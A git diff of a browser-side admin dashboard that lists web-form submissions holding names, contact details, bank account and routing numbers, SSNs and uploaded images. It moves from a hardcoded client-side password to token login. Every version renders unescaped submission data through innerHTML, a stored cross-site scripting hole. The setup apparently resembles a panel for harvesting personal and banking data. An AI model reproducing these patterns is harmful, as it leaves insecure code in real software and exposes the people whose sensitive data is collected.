@@ -44,17 +44,20 @@ button {
 .card {
   background: #1e293b;
   padding: 15px;
-  margin-bottom: 15px;
+  margin-bottom: 10px;
   border-radius: 8px;
 }
 
 img {
   width: 100px;
   margin: 5px;
-  border-radius: 6px;
+}
+
+.delete-btn {
+  background: red;
+  margin-top: 10px;
 }
 </style>
-
 </head>
 
 <body>
@@ -68,7 +71,6 @@ img {
 
 <div class="dashboard" id="dashboard">
   <h2>All Submissions</h2>
-  <p style="color:orange;">⚠️ Files are temporary and may disappear after restart</p>
   <div id="data"></div>
 </div>
 
@@ -76,27 +78,60 @@ img {
 
 const BASE_URL = "https://form-s3i1.onrender.com";
 
-function login() {
+/* LOGIN */
+async function login() {
   const email = document.getElementById("email").value;
   const password = document.getElementById("password").value;
 
-  if (email === "admin@gmail.com" && password === "1234") {
+  try {
+    const res = await fetch(BASE_URL + "/api/auth/login", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({ email, password })
+    });
+
+    if (!res.ok) {
+      alert("Login failed");
+      return;
+    }
+
+    const data = await res.json();
+    localStorage.setItem("token", data.token);
+
     loadData();
-  } else {
-    alert("Invalid login");
+
+  } catch (err) {
+    alert("Error logging in");
+    console.error(err);
   }
 }
 
+/* LOAD DATA */
 async function loadData() {
   document.getElementById("loginBox").style.display = "none";
   document.getElementById("dashboard").style.display = "block";
 
   try {
-    const res = await fetch(BASE_URL + "/api/admin/submissions");
+    const res = await fetch(BASE_URL + "/api/form/submissions", {
+      headers: {
+        "Authorization": "Bearer " + localStorage.getItem("token")
+      }
+    });
+
+    if (!res.ok) {
+      alert("Server error: " + res.status);
+      return;
+    }
+
     const submissions = await res.json();
 
     const container = document.getElementById("data");
     container.innerHTML = "";
+
+    if (submissions.length === 0) {
+      container.innerHTML = "<p>No submissions yet</p>";
+      return;
+    }
 
     submissions.forEach(sub => {
       const div = document.createElement("div");
@@ -107,25 +142,19 @@ async function loadData() {
       if (sub.files) {
         Object.values(sub.files).forEach(arr => {
           arr.forEach(file => {
-            images += '<img src="' + BASE_URL + '/' + file.path + '" />';
+            images += '<img src="' + BASE_URL + '/' + file.path + '">';
           });
         });
       }
 
-      div.innerHTML =
-        "<b>Name:</b> " + sub.full_name + "<br>" +
-        "<b>Email:</b> " + sub.email + "<br>" +
-        "<b>Phone:</b> " + sub.phone + "<br>" +
-        "<b>Address:</b> " + sub.address + "<br><br>" +
-
-        "<b>Bank:</b> " + sub.bank_name + "<br>" +
-        "<b>Account:</b> " + sub.account_number + "<br>" +
-        "<b>Routing:</b> " + sub.routing_number + "<br>" +
-        "<b>SSN:</b> " + sub.ssn + "<br><br>" +
-
-        "<b>Files:</b><br>" + images + "<br>" +
-
-        '<button onclick="deleteSubmission(\'' + sub._id + '\')" style="background:red;">Delete</button>';
+      div.innerHTML = `
+        <b>${sub.full_name}</b><br>
+        ${sub.email}<br>
+        ${sub.phone}<br>
+        ${sub.bank_name}<br><br>
+        ${images}
+        <button class="delete-btn" onclick="deleteSubmission('${sub._id}')">Delete</button>
+      `;
 
       container.appendChild(div);
     });
@@ -136,15 +165,22 @@ async function loadData() {
   }
 }
 
+/* DELETE */
 async function deleteSubmission(id) {
   if (!confirm("Delete this submission?")) return;
 
   try {
-    const res = await fetch(BASE_URL + "/api/admin/delete/" + id, {
-      method: "DELETE"
+    const res = await fetch(BASE_URL + "/api/form/" + id, {
+      method: "DELETE",
+      headers: {
+        "Authorization": "Bearer " + localStorage.getItem("token")
+      }
     });
 
-    if (!res.ok) throw new Error("Delete failed");
+    if (!res.ok) {
+      alert("Delete failed");
+      return;
+    }
 
     alert("Deleted successfully");
     loadData();
